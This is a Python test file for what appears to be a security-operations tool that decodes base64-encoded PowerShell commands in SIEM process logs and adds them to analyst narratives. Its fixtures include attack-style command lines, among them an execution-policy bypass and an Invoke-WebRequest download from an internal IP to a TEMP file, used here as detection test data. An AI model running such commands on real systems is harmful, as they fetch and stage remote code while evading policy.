"""Encoded PowerShell: decoded by code in the handoff of the loop that sees it (B10)."""

import base64

from contracts import DomainFinding, ResultSet

from contracts.reasoning import COMMANDS_FOOTER, ENCODED_FOOTER
from smartops.subagent_analysts.analyze import ENCODED_LINE_CAP, _as_record
from smartops.subagent_analysts.routing import DomainSlice
from smartops.tools.native.decoder import commands_in, encoded, signature

BLOB = "JABlAG4AdgA6AHUAcwBlAHIAbgBhAG0AZQA="  # $env:username, from run e1461da6
DESKTOP = r"C:\Users\Administrator\Desktop\splunkd.exe"
ROW = {"CommandLine": f'powershell.exe -ExecutionPolicy Bypass -C "powershell.exe -EncodedCommand {BLOB}"',
       "ParentImage": DESKTOP, "count": "4"}


def test_decodes_encoded_command_and_ignores_lookalikes():
    assert encoded(f"powershell.exe -EncodedCommand {BLOB}") == {BLOB: "$env:username"}
    assert list(encoded(f"pwsh /enc {BLOB} -e Bypass -ExecutionPolicy Bypass").values()) == ["$env:username"]
    assert encoded("powershell.exe -ExecutionPolicy Bypass -C Get-Process") == {}
    assert signature(BLOB) == signature(BLOB) and signature(BLOB).startswith("enc#")


def test_the_handoff_carries_reference_parents_and_plain_text_in_the_same_loop():
    slice_ = DomainSlice(domain="endpoint", siem_sets=[("processes", ResultSet(query="q", row_count=1, rows=[ROW]))])
    finding = DomainFinding(domain="endpoint", narrative="PowerShell ran an encoded command.")

    narrative = "\n".join(_as_record(finding, slice_).facts)

    assert (
        f"~ encoded command {signature(BLOB)}: 4 events, parent {DESKTOP}=4; decodes to: $env:username"
        in narrative
    )


def _enc(text: str) -> str:
    return base64.b64encode(text.encode("utf-16-le")).decode()


def _lines(rows: list[dict]) -> list[str]:
    slice_ = DomainSlice(domain="endpoint", siem_sets=[("processes", ResultSet(query="q", row_count=len(rows), rows=rows))])
    narrative = "\n".join(_as_record(DomainFinding(domain="endpoint", narrative="n"), slice_).facts)
    return narrative.split(ENCODED_FOOTER + "\n")[1].splitlines()


def test_encoded_lines_are_capped_rarest_parent_first():
    # dce405e5's shape: the rare parent's one command has MORE events than each
    # one-off from the busy parent, so ranking by events alone would cut it.
    rows = [{"CommandLine": f"powershell -e {_enc(f'Get-Process -Id {i}')}", "ParentImage": r"C:\common.exe", "count": "1"}
            for i in range(9)]
    rows.append({"CommandLine": f"powershell -e {_enc('Get-Rare')}", "ParentImage": r"C:\rare.exe", "count": "3"})

    lines = _lines(rows)

    assert lines[0].startswith("~ encoded command") and "Get-Rare" in lines[0]
    assert sum(l.startswith("~ encoded command") for l in lines) == ENCODED_LINE_CAP == 8
    assert "2 more encoded commands not shown" in lines[-1]


def test_nested_encoded_command_cut_by_splunk_still_decodes():
    inner = _enc("Get-Process -Name explorer")[:30]  # odd length, as Splunk left it
    rows = [{"CommandLine": f"powershell -e {_enc(f'powershell -EncodedCommand {inner}')}", "count": "1"}]

    assert "Get-Proces" in _lines(rows)[0]


def test_plain_interpreter_command_lines_reach_the_narrative():
    # 148b0e69: the download sat in four tasks' rows and no narrative named it.
    download = ("powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest -Uri "
                "http://192.168.40.211/update/win-agent-2.4.1.bin -OutFile $env:TEMP\\svcupdate.dat\"")
    rows = [
        {"Processes.process": download, "count": "1"},
        {"Processes.process": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "count": "5"},
        {"Processes.process": r"C:\Windows\explorer.exe /factory", "count": "2"},
        {"Processes.process": f"powershell.exe -EncodedCommand {BLOB}", "count": "3"},
    ]
    slice_ = DomainSlice(domain="endpoint", siem_sets=[("processes", ResultSet(query="q", row_count=4, rows=rows))])

    first = "\n".join(_as_record(DomainFinding(domain="endpoint", narrative="n"), slice_).facts)
    block = first.split(COMMANDS_FOOTER + "\n")[1].splitlines()

    assert block == [f"~ 1 events: {download}"]


def test_a_raw_sysmon_row_gives_its_command_line_from_the_xml():
    # 148b0e69's T4 searched by hash and tabled `_raw`: the download sat in the XML.
    raw = "<Data Name='CommandLine'>powershell.exe -C Test-Connection 10.0.10.1</Data>"
    assert commands_in([{"_raw": raw}]) == {"powershell.exe -C Test-Connection 10.0.10.1": 1}
